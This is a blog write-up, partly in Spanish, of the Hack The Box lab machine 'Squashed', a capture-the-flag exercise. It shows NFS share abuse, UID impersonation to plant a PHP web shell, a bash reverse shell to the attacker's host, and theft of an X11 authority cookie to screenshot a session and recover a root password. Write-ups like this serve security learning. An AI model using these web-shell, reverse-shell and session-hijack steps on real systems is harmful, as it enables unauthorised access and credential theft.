<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.png"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-squashed-writeup">Hack The Box: Squashed Writeup</h1>
<p>Welcome to my detailed writeup of the easy difficulty machine <strong>&ldquo;Squashed&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.228.109 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.228.109 -&gt; <span style="color:#f92672">[</span>22,80,111,2049,44291,49353,50057,53893<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,80,111,2049,44291,49353,50057,53893 -sCV 10.129.228.109 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 15:45 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.109
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp    open  http     Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Built Better
</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind  2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)</span>
</span></span><span style="display:flex;"><span>| rpcinfo: 
</span></span><span style="display:flex;"><span>|   program version    port/proto  service
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp   rpcbind
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp   rpcbind
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/tcp6  rpcbind
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/udp6  rpcbind
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100003</span>  <span style="color:#ae81ff">3</span>           2049/udp   nfs
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100003</span>  <span style="color:#ae81ff">3</span>           2049/udp6  nfs
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100003</span>  3,4         2049/tcp   nfs
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100003</span>  3,4         2049/tcp6  nfs
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      35859/udp6  mountd
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      52835/tcp6  mountd
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      53893/tcp   mountd
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100005</span>  1,2,3      58461/udp   mountd
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      34979/tcp6  nlockmgr
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      44291/tcp   nlockmgr
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      54708/udp6  nlockmgr
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100021</span>  1,3,4      56514/udp   nlockmgr
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100227</span>  <span style="color:#ae81ff">3</span>           2049/tcp   nfs_acl
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100227</span>  <span style="color:#ae81ff">3</span>           2049/tcp6  nfs_acl
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100227</span>  <span style="color:#ae81ff">3</span>           2049/udp   nfs_acl
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">100227</span>  <span style="color:#ae81ff">3</span>           2049/udp6  nfs_acl
</span></span><span style="display:flex;"><span>2049/tcp  open  nfs      3-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100003)</span>
</span></span><span style="display:flex;"><span>44291/tcp open  nlockmgr 1-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100021)</span>
</span></span><span style="display:flex;"><span>49353/tcp open  mountd   1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
</span></span><span style="display:flex;"><span>50057/tcp open  mountd   1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
</span></span><span style="display:flex;"><span>53893/tcp open  mountd   1-3 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100005)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.96 seconds
</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.228.109 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 15:46 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.109
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1492</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>111/udp   open   rpcbind
</span></span><span style="display:flex;"><span>464/udp   closed kpasswd5
</span></span><span style="display:flex;"><span>1035/udp  closed mxxrlogin
</span></span><span style="display:flex;"><span>2049/udp  open   nfs
</span></span><span style="display:flex;"><span>18994/udp closed unknown
</span></span><span style="display:flex;"><span>20288/udp closed unknown
</span></span><span style="display:flex;"><span>23230/udp closed unknown
</span></span><span style="display:flex;"><span>30473/udp closed unknown
</span></span></code></pre></div><h1 id="nfs-enumeration">NFS Enumeration</h1>
<p>Me llama la atención el servicio NFS expuesto ya que no es común encontrarse con esto.</p>
<p>Vamos a instalar el paquete <code>nfs-common</code>
<code>sudo apt-get install nfs-common -y</code></p>
<p>Ahora vamos a montar la raíz del sistema de archivos al directorio <code>/mnt/montura</code></p>
<p>Primero creamos la carpeta.
<code>mkdir /mnt/montura</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo mount -t nfs 10.129.228.109:/ /mnt/montura
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ls -la /mnt/montura
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">20</span> root root <span style="color:#ae81ff">4096</span> oct <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2022</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">14</span> ago  <span style="color:#ae81ff">5</span> 15:49 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> oct <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2022</span> home
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">16</span> root root <span style="color:#ae81ff">4096</span> oct <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2022</span> var
</span></span></code></pre></div><p>Y vemos contenido.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ find . -type f 2&gt;/dev/null
</span></span><span style="display:flex;"><span>./ross/.xsession-errors.old
</span></span><span style="display:flex;"><span>./ross/Documents/Passwords.kdbx
</span></span><span style="display:flex;"><span>./ross/.xsession-errors
</span></span><span style="display:flex;"><span>./ross/.Xauthority
</span></span></code></pre></div><p>Vemos un <code>Passwords.kdbx</code> que me llama la atención.</p>
<p>Investigando la bbdd de keepass, no encuentro nada que se pueda hacer ya que <code>keepass2john</code> no soporta la versión de KeePass con la que fue creada la base de datos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ keepass2john Passwords.kdbx 
</span></span><span style="display:flex;"><span>! Passwords.kdbx : File version <span style="color:#e6db74">&#39;40000&#39;</span> is currently not supported!
</span></span></code></pre></div><h1 id="uid-hijacking---foothold">UID Hijacking -&gt; Foothold</h1>
<p>Me dió curiosidad lo siguiente
No podía acceder al directorio <code>html</code> que supongo que corresponderá con el sitio web.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cd html/
</span></span><span style="display:flex;"><span>bash: cd: html/: Permission denied
</span></span></code></pre></div><p>Pero con <code>find .</code> podía ver algunos directorio y ficheros de dentro del directorio <code>html</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ find .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>./html
</span></span><span style="display:flex;"><span>find: ‘./html/.htaccess’: Permission denied
</span></span><span style="display:flex;"><span>./html/.htaccess
</span></span><span style="display:flex;"><span>find: ‘./html/index.html’: Permission denied
</span></span><span style="display:flex;"><span>./html/index.html
</span></span><span style="display:flex;"><span>find: ‘./html/images’: Permission denied
</span></span><span style="display:flex;"><span>./html/images
</span></span><span style="display:flex;"><span>find: ‘./html/css’: Permission denied
</span></span><span style="display:flex;"><span>./html/css
</span></span><span style="display:flex;"><span>find: ‘./html/js’: Permission denied
</span></span><span style="display:flex;"><span>./html/js
</span></span></code></pre></div><p>Y me dí cuenta de que podríamos hacer un UID Hijacking
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Podemos crear un usuario con el UID <code>2017</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo useradd -u <span style="color:#ae81ff">2017</span> pointedc
</span></span></code></pre></div><p>Y ahora en principio podríamos acceder a este directorio.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Ahora si cambiamos al usuario <code>pointedc</code> podemos acceder al directorio y por ejemplo, crear archivos.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Y se refleja en el sitio web.
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Podemos comprobar si el sitio interpreta PHP, aunque leyendo el <code>.htaccess</code> ya nos da la pista de que sí.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; test.php
</span></span></code></pre></div><p><img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Nos creamos una pequeña web shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat shell.php 
</span></span><span style="display:flex;"><span>&lt;?php echo <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span> . shell_exec<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span> . <span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>; ?&gt;
</span></span></code></pre></div><p>Y ya nos podemos mandar la rev shell
<code>http://10.129.228.109/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.18/443%200%3E%261%22</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.18<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.228.109<span style="color:#f92672">]</span> <span style="color:#ae81ff">58462</span>
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1050<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>alex@squashed:/var/www/html$ 
</span></span><span style="display:flex;"><span>alex@squashed:/var/www/html$ whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>alex
</span></span></code></pre></div><p>Y ya podemos leer la flag de usuario</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>alex@squashed:/var/www/html$ cat /home/alex/user.txt
</span></span><span style="display:flex;"><span>cat /home/alex/user.txt
</span></span><span style="display:flex;"><span>f469293aeb9ecd01....
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Si nos damos cuenta, hemos ganado acceso como el usuario <code>alex</code> y en el NFS, estaba el directorio personal de trabajo de un usuario llamado <code>ross</code></p>
<p>Dentro de este directorio se encontraba un archivo <code>.Xauthority</code> pero todavía no lo había analizado porque ya tengo un usuario en mi máquina con ese UID.</p>
<p>Me interesa tanto este archivo porque podemos enumerar que el usuario <code>ross</code> tiene una sesión activa en el equipo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>alex@squashed:/home/alex$ w
</span></span><span style="display:flex;"><span>w
</span></span><span style="display:flex;"><span> 10:10:41 up <span style="color:#ae81ff">41</span> min,  <span style="color:#ae81ff">1</span> user,  load average: 0.00, 0.00, 0.00
</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span>ross     tty7     :0               09:29   41:36   3.57s  0.03s /usr/libexec/gnome-session-binary --systemd --session<span style="color:#f92672">=</span>gnome
</span></span></code></pre></div><p>Y con este archivo <code>.XAuthority</code> que es de <code>ross</code> podría conseguir ver la pantalla de este usuario y quizás se filtre información confidencial.</p>
<p>Tengo dos opciones, o asignar una Shell a este usuario para poder migrar a este, o cambiar el UID de este usuario y crear otro usuario con el UID 1001.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Voy asignarle una shell temporalmente..
<code>$ sudo usermod --shell /bin/bash '_laurel'</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo su <span style="color:#e6db74">&#39;_laurel&#39;</span>
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>_laurel@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>/mnt/montura/home/ross<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ $
</span></span></code></pre></div><p>Ahora ya puedo migrar a este usuario.</p>
<p>Me voy a copiar este archivo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$cp .Xauthority /tmp/.Xauthority
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo chown pointedsec:pointedsec .Xauthority
</span></span></code></pre></div><p>Ahora siguiendo <a href="https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11">este</a> apartado de HackTricks.</p>
<p>Me comparto este archivo a la máquina víctima.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>alex@squashed:/home/alex$ wget http://10.10.14.18:8081/.Xauthority
</span></span></code></pre></div><p>Recapitulemos, este archivo contiene una Cookie de 128 bits que el cliente manda al servidor, esta cookie sirve para la autorización de X11, que en palabras simples y &ldquo;mal&rdquo;, sería como una especie de RDP.</p>
<p><img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Exportamos la cookie.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>alex@squashed:/home/alex$ export XAUTHORITY<span style="color:#f92672">=</span>/home/alex/.Xauthority
</span></span><span style="display:flex;"><span>export XAUTHORITY<span style="color:#f92672">=</span>/home/alex/.Xauthority
</span></span></code></pre></div><p>Nos responde con información de la pantalla, por lo cual esto es bueno.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>alex@squashed:/home/alex$ xdpyinfo -display :0 | less
</span></span><span style="display:flex;"><span>xdpyinfo -display :0 | less
</span></span><span style="display:flex;"><span>WARNING: terminal is not fully functional
</span></span><span style="display:flex;"><span>-  <span style="color:#f92672">(</span>press RETURN<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>name of display:    :0
</span></span><span style="display:flex;"><span>version number:    11.0
</span></span><span style="display:flex;"><span>vendor string:    The X.Org Foundation
</span></span><span style="display:flex;"><span>vendor release number:    <span style="color:#ae81ff">12013000</span>
</span></span><span style="display:flex;"><span>X.Org version: 1.20.13
</span></span><span style="display:flex;"><span>maximum request size:  <span style="color:#ae81ff">16777212</span> bytes
</span></span><span style="display:flex;"><span>motion buffer size:  <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>bitmap unit, bit order, padding:    32, LSBFirst, <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>image byte order:    LSBFirst
</span></span><span style="display:flex;"><span>number of supported pixmap formats:    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>supported pixmap formats:
</span></span><span style="display:flex;"><span>    depth 1, bits_per_pixel 1, scanline_pad <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    depth 4, bits_per_pixel 8, scanline_pad <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    depth 8, bits_per_pixel 8, scanline_pad <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    depth 15, bits_per_pixel 16, scanline_pad <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    depth 16, bits_per_pixel 16, scanline_pad <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    depth 24, bits_per_pixel 32, scanline_pad <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>    depth 32, bits_per_pixel 32, scanline_pad <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>keycode range:    minimum 8, maximum <span style="color:#ae81ff">255</span>
</span></span><span style="display:flex;"><span>focus:  window 0x1e00006, revert to PointerRoot
</span></span><span style="display:flex;"><span>number of extensions:    <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>    BIG-REQUESTS
</span></span><span style="display:flex;"><span>    Composite
</span></span><span style="display:flex;"><span>.....
</span></span></code></pre></div><p>Ahora podemos hacer una captura de pantalla de la sesión <code>:0</code> que habíamos detectado antes con el comando <code>w</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>alex@squashed:/tmp$ xwd -root -screen -silent -display :0 &gt; screenshot.xwd
</span></span><span style="display:flex;"><span>xwd -root -screen -silent -display :0 &gt; screenshot.xwd
</span></span><span style="display:flex;"><span>alex@squashed:/tmp$ ls
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>screenshot.xwd
</span></span></code></pre></div><p>Ahora nos pasamos este archivo a nuestra máquina de atacante y la convertimos a PNG</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ convert screenshot.xwd screenshot.png
</span></span></code></pre></div><p>Y vaya vaya, ¡tenemos credenciales!
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Me pensaba que iban a ser las credenciales para el usuario <code>ross</code> pero inocentemente probando estas credenciales para root&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>alex@squashed:/var/www/html$ su ross
</span></span><span style="display:flex;"><span>su ross
</span></span><span style="display:flex;"><span>Password: cah$mei7rai9A
</span></span><span style="display:flex;"><span>su: Authentication failure
</span></span><span style="display:flex;"><span>alex@squashed:/var/www/html$ su root
</span></span><span style="display:flex;"><span>su root
</span></span><span style="display:flex;"><span>Password: cah$mei7rai9A
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Y ya podríamos leer la flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat root.txt
</span></span><span style="display:flex;"><span>795ede7c08b5f41....
</span></span></code></pre></div><p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
